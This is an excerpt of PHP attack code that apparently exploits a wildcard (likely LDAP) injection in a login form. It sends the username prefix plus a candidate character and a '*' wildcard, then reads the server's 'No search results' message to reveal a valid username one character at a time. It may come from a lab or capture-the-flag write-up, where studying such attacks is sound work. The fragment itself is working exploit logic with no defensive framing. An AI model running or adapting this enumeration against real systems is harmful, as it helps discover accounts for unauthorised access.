...
while (!$usernameFound) {
    for ($i = 0; $i < count($characterArray); $i++) {
        $curlResponse = sendPostToLogin($discoveredUsername.$characterArray[$i].'*', '*');
        if ($curlResponse === false) {
            echo 'Error: '.curl_error($curl);
        } else {
            if (strpos($curlResponse, 'No search results') !== false) {
                $discoveredUsername .= $characterArray[$i];
                echo $discoveredUsername."\n";
                break;
            } else {
                echo ".";
            }
        ...
        if ($i == count($characterArray) - 1) {
            $usernameFound = true;
            echo "\nEnumerated username: $discoveredUsername\n";
        }
    }
}
